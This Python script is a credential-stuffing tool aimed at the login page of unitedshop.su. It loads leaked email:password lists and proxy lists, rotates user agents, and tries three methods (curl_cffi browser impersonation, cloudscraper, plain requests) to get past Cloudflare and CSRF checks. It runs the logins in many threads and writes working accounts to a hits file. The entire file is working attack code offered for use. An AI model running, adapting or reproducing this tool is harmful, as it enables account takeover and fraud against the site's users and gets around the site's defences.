import os
import random
import requests
import time
import warnings
import threading
import shutil
import re
from queue import Queue
from colorama import init, Fore, Style
from user_agent import generate_user_agent

# Try to import advanced bypass libraries
try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except ImportError:
    CLOUDSCRAPER_AVAILABLE = False

try:
    from curl_cffi import requests as curl_requests
    CURL_CFFI_AVAILABLE = True
except ImportError:
    CURL_CFFI_AVAILABLE = False

warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Code By - @LEGEND_BL
UA_CONFIGS = [
    {'os': 'win', 'navigator': 'chrome'},
    {'os': 'win', 'navigator': 'firefox'},
    {'os': 'mac', 'navigator': 'chrome'},
    {'os': 'linux', 'navigator': 'chrome'},
    {'os': 'android', 'navigator': 'chrome'},
]

# Chrome versions to rotate
CHROME_VERSIONS = ['120', '121', '122', '123', '124']

def get_random_user_agent():
    try:
        config = random.choice(UA_CONFIGS)
        return generate_user_agent(os=config['os'], navigator=config['navigator'])
    except:
        version = random.choice(CHROME_VERSIONS)
        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36"

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

columns = shutil.get_terminal_size(fallback=(80, 20)).columns
os.system('cls' if os.name == 'nt' else 'clear')

print(f"{Fore.CYAN}{'UNITEDSHOP.SU CHECKER'.center(columns)}")
print(f"{Fore.YELLOW}{'Code By — @LEGEND_BL'.center(columns)}")
if CLOUDSCRAPER_AVAILABLE:
    print(f"{Fore.GREEN}{'[CloudScraper: ON]'.center(columns)}")
if CURL_CFFI_AVAILABLE:
    print(f"{Fore.GREEN}{'[curl_cffi: ON]'.center(columns)}")
print(f"{Fore.YELLOW}{'[Note: Site has strong Cloudflare protection]'.center(columns)}")

combo_input = input(f"\n{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip()
combo_file = combo_input.strip('"').strip("'").strip() or "combo.txt"

proxy_input = input(f"{Fore.CYAN}Proxy file (default: proxy.txt): {Style.RESET_ALL}").strip()
proxy_file = proxy_input.strip('"').strip("'").strip() or "proxy.txt"

def load_combos(fn):
    try:
        fn = fn.strip().strip('"').strip("'").strip()
        if not os.path.exists(fn):
            print(f"{Fore.RED}[-] File not found: {fn}")
            return []
        with open(fn, encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ":" in ln and ln.strip()]
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}")
        return []

def load_proxies(fn):
    try:
        fn = fn.strip().strip('"').strip("'").strip()
        if not os.path.exists(fn):
            print(f"{Fore.RED}[-] File not found: {fn}")
            return []
        with open(fn, encoding="utf-8", errors="ignore") as f:
            proxies = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith('#')]
            return proxies if proxies else []
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}")
        return []

def format_proxy(p):
    if not p:
        return None
    p = p.strip()
    
    if "://" in p:
        protocol = p.split("://")[0].lower()
        rest = p.split("://", 1)[1]
        if protocol in ['socks4', 'socks5', 'socks5h'] and not SOCKS_AVAILABLE:
            return None
        if "@" in rest:
            auth_part, host_part = rest.rsplit("@", 1)
            if ":" in auth_part:
                username, password = auth_part.split(":", 1)
                proxy_url = f"{protocol}://{username}:{password}@{host_part}"
            else:
                proxy_url = f"{protocol}://{rest}"
        else:
            proxy_url = f"{protocol}://{rest}"
        return {"http": proxy_url, "https": proxy_url}
    
    elif "@" in p:
        auth_part, host_part = p.rsplit("@", 1)
        if ":" in auth_part:
            username, password = auth_part.split(":", 1)
            proxy_url = f"http://{username}:{password}@{host_part}"
            return {"http": proxy_url, "https": proxy_url}
    
    parts = p.split(":")
    if len(parts) == 4:
        host, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    elif len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None

combos = load_combos(combo_file)
proxies = load_proxies(proxy_file)

if not combos:
    input(f"\n{Fore.RED}No combos found. Press Enter to exit...")
    exit()

use_proxies = True
if not proxies:
    print(f"{Fore.YELLOW}[!] No proxies found in {proxy_file}")
    mode_input = input(f"{Fore.CYAN}Check accounts WITHOUT proxy? (y/n, default: n): {Style.RESET_ALL}").strip().lower()
    if mode_input == 'y':
        use_proxies = False
        print(f"{Fore.YELLOW}[*] Proxy-less mode: Will check {len(combos)} accounts\n")
    else:
        input(f"\n{Fore.RED}proxy.txt is REQUIRED for full checking! Press Enter to exit...")
        exit()

if use_proxies:
    threads_input = input(f"{Fore.CYAN}Threads (1-50, default 5): {Style.RESET_ALL}").strip()
    threads_count = max(1, min(50, int(threads_input) if threads_input.isdigit() else 5))
else:
    threads_count = 1
    print(f"{Fore.YELLOW}[*] Using 1 thread for proxy-less mode\n")

if use_proxies:
    print(f"{Fore.CYAN}Loaded {len(combos)} combos | {len(proxies)} proxies | Threads: {threads_count}\n")
else:
    print(f"{Fore.CYAN}Loaded {len(combos)} combos | No proxies | Threads: {threads_count}\n")
print(f"{Fore.BLUE}[*] Starting checker...!\n")

hit_counter = fail_counter = cf_blocked = 0
counters_lock = threading.Lock()
print_lock = threading.Lock()
result_counter = 0

def get_browser_headers():
    """Generate realistic browser headers"""
    version = random.choice(CHROME_VERSIONS)
    return {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "sec-ch-ua": f'"Not_A Brand";v="8", "Chromium";v="{version}", "Google Chrome";v="{version}"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Cache-Control": "max-age=0",
    }

def check_with_curl_cffi(email, pwd, proxy_dict):
    """Try with curl_cffi for better TLS fingerprinting"""
    if not CURL_CFFI_AVAILABLE:
        return None, None
    
    try:
        # Get login page
        r1 = curl_requests.get('https://unitedshop.su/login',
                               impersonate='chrome120',
                               proxies=proxy_dict,
                               timeout=35,
                               verify=False)
        
        if r1.status_code == 403:
            return "cf_blocked", "Cloudflare blocked"
        
        # Extract CSRF
        csrf = ""
        csrf_match = re.search(r'name=["\']?_?csrf[_-]?token["\']?\s*value=["\']([^"\']+)["\']', r1.text, re.I)
        if csrf_match:
            csrf = csrf_match.group(1)
        
        # Login
        data = {"username": email, "password": pwd}
        if csrf:
            data["_token"] = csrf
        
        r = curl_requests.post('https://unitedshop.su/login',
                               data=data,
                               impersonate='chrome120',
                               proxies=proxy_dict,
                               timeout=35,
                               verify=False,
                               allow_redirects=True)
        
        txt = r.text.lower()
        url = str(r.url).lower()
        
        if any(x in url for x in ["dashboard", "panel", "account"]) and "login" not in url:
            return "hit", "Valid"
        if any(x in txt for x in ["balance", "logout", "welcome", "deposit"]):
            return "hit", "Valid"
        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials"
        if "login" in url:
            return "fail", "Login failed"
        if r.status_code == 403:
            return "cf_blocked", "Cloudflare blocked"
        return "fail", f"Status {r.status_code}"
    except Exception as e:
        return "error", str(e)[:30]

def check_with_cloudscraper(email, pwd, proxy_dict):
    """Try with CloudScraper"""
    if not CLOUDSCRAPER_AVAILABLE:
        return None, None
    
    try:
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': random.choice(['chrome', 'firefox']),
                'platform': 'windows',
                'desktop': True
            },
            delay=random.randint(5, 10)
        )
        
        # Get login page
        r1 = scraper.get('https://unitedshop.su/login', proxies=proxy_dict, timeout=35)
        
        if r1.status_code == 403:
            return "cf_blocked", "Cloudflare blocked"
        
        # Extract CSRF
        csrf = ""
        csrf_match = re.search(r'name=["\']?_?csrf[_-]?token["\']?\s*value=["\']([^"\']+)["\']', r1.text, re.I)
        if csrf_match:
            csrf = csrf_match.group(1)
        
        # Login
        data = {"username": email, "password": pwd}
        if csrf:
            data["_token"] = csrf
        
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        r = scraper.post('https://unitedshop.su/login', data=data, headers=headers,
                         proxies=proxy_dict, timeout=35, allow_redirects=True)
        
        txt = r.text.lower()
        url = r.url.lower()
        
        if any(x in url for x in ["dashboard", "panel", "account"]) and "login" not in url:
            return "hit", "Valid"
        if any(x in txt for x in ["balance", "logout", "welcome", "deposit"]):
            return "hit", "Valid"
        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials"
        if "login" in url:
            return "fail", "Login failed"
        if r.status_code == 403:
            return "cf_blocked", "Cloudflare blocked"
        return "fail", f"Status {r.status_code}"
    except Exception as e:
        return "error", str(e)[:30]

def check_with_requests(email, pwd, proxy_dict):
    """Standard requests with browser headers"""
    s = requests.Session()
    headers = get_browser_headers()
    
    try:
        # Get login page
        r1 = s.get("https://unitedshop.su/login", headers=headers, proxies=proxy_dict, timeout=35, verify=False)
        
        if r1.status_code == 403:
            return "cf_blocked", "Cloudflare blocked"
        
        # Extract CSRF
        csrf = ""
        for pattern in [
            r'name=["\']?csrf[_-]?token["\']?\s*value=["\']([^"\']+)["\']',
            r'name=["\']?_token["\']?\s*value=["\']([^"\']+)["\']',
        ]:
            match = re.search(pattern, r1.text, re.I)
            if match:
                csrf = match.group(1)
                break
        
        # Update headers for POST
        headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://unitedshop.su",
            "Referer": "https://unitedshop.su/login",
        })
        
        # Login
        data = {"username": email, "password": pwd}
        if csrf:
            data["_token"] = csrf
            data["csrf_token"] = csrf
        
        r = s.post("https://unitedshop.su/login", data=data, headers=headers,
                   proxies=proxy_dict, timeout=35, verify=False, allow_redirects=True)
        
        txt = r.text.lower()
        url = r.url.lower()
        
        if any(x in url for x in ["dashboard", "panel", "account"]) and "login" not in url:
            return "hit", "Valid"
        if any(x in txt for x in ["balance", "logout", "welcome", "deposit"]):
            return "hit", "Valid"
        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
            return "fail", "Invalid credentials"
        if "login" in url:
            return "fail", "Login failed"
        if r.status_code == 403:
            return "cf_blocked", "Cloudflare blocked"
        return "fail", f"Status {r.status_code}"
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except Exception as e:
        return "error", str(e)[:30]

def check_account(email, pwd, proxy_dict):
    """Check account using multiple methods"""
    
    # Method 1: curl_cffi (best TLS fingerprint)
    if CURL_CFFI_AVAILABLE:
        result, reason = check_with_curl_cffi(email, pwd, proxy_dict)
        if result and result not in ["error", "cf_blocked"]:
            return result, reason
        if result == "cf_blocked":
            pass  # Try other methods
    
    # Method 2: CloudScraper
    if CLOUDSCRAPER_AVAILABLE:
        result, reason = check_with_cloudscraper(email, pwd, proxy_dict)
        if result and result not in ["error", "cf_blocked"]:
            return result, reason
        if result == "cf_blocked":
            pass  # Try other methods
    
    # Method 3: Standard requests
    result, reason = check_with_requests(email, pwd, proxy_dict)
    return result, reason

def worker(q):
    global result_counter, hit_counter, fail_counter, cf_blocked
    while True:
        try:
            combo = q.get_nowait()
        except:
            break
        
        email, pwd = combo.split(":", 1)
        proxy_dict = None
        
        if use_proxies:
            for _ in range(3):
                proxy_str = random.choice(proxies)
                proxy_dict = format_proxy(proxy_str)
                if proxy_dict: break
            
            if not proxy_dict:
                with counters_lock: fail_counter += 1
                with counters_lock: num = result_counter + 1; result_counter = num
                with print_lock:
                    print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | Bad proxy")
                q.task_done()
                continue
        
        result, reason = "error", "Unknown"
        for attempt in range(3):
            result, reason = check_account(email, pwd, proxy_dict)
            if result not in ["error"]:
                break
            time.sleep(5 + attempt * 3)  # Longer delays for CF
        
        with counters_lock: num = result_counter + 1; result_counter = num
        
        if result == "hit":
            with counters_lock: hit_counter += 1
            with open("Unitedshop_Hits.txt", "a", encoding="utf-8") as f:
                f.write(f"{email}:{pwd} | Code By - @LEGEND_BL\n")
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.GREEN}{email}:{pwd} | Status: Valid")
        elif result == "cf_blocked":
            with counters_lock: cf_blocked += 1
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.YELLOW}{email}:{pwd} | Cloudflare blocked")
        else:
            with counters_lock: fail_counter += 1
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | {reason}")
        
        q.task_done()
        time.sleep(5)  # Longer delay between checks

def main():
    q = Queue()
    for c in combos:
        q.put(c)
    
    open("Unitedshop_Hits.txt", "w").close()
    
    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(q,), daemon=True)
        t.start()
    
    q.join()
    
    print(f"\n{Fore.CYAN}Finished...!")
    print(f"{Fore.GREEN}Hits: {hit_counter} | {Fore.RED}Failed: {fail_counter} | {Fore.YELLOW}CF Blocked: {cf_blocked}")
    print(f"{Fore.CYAN}Hits saved to Unitedshop_Hits.txt")
    if cf_blocked > 0:
        print(f"{Fore.YELLOW}[!] Note: Site has strong Cloudflare protection")
        print(f"{Fore.YELLOW}[!] Try with different proxies or wait and retry later")
    input(f"\nPress Enter to exit...")

if __name__ == "__main__":
    main()
